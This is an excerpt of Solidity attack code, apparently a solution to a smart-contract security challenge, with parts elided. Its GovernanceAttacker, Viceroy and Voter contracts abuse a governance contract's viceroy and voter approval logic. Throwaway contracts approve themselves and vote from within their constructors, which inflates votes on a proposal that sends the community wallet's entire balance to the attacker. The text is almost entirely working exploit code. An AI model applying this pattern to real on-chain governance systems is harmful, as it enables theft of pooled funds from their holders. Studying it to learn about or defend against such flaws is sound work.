...
contract GovernanceAttacker {
    ...
    function attack(Governance _gov) external {
        gov = _gov;

        Viceroy v = new Viceroy(gov);
        v.execute();
    }

    function appointMe() external {
        gov.appointViceroy(msg.sender, 1);
    }
...
contract Viceroy {
    ...
    constructor(Governance _gov) {
        gov = _gov;

        GovernanceAttacker(payable(msg.sender)).appointMe();
    }
    ...
    function execute() external {
        ...
        bytes memory proposal = abi.encodeWithSelector(
            ...
            address(msg.sender),
            "",
            address(gov.communityWallet()).balance
        );
        uint256 proposalId = uint256(keccak256(proposal));

        gov.createProposal(address(0), proposal);

        for (uint256 i; i < 10; i++) {
            Voter v = new Voter(proposalId);
            gov.disapproveVoter(address(v));
        }
    ...
    function approveMe() external {
        gov.approveVoter(msg.sender);
    }
}

contract Voter {
    constructor(uint256 proposalId) {
        Viceroy(msg.sender).approveMe();
        Viceroy(msg.sender).gov().voteOnProposal(proposalId, true, msg.sender);
    }
}
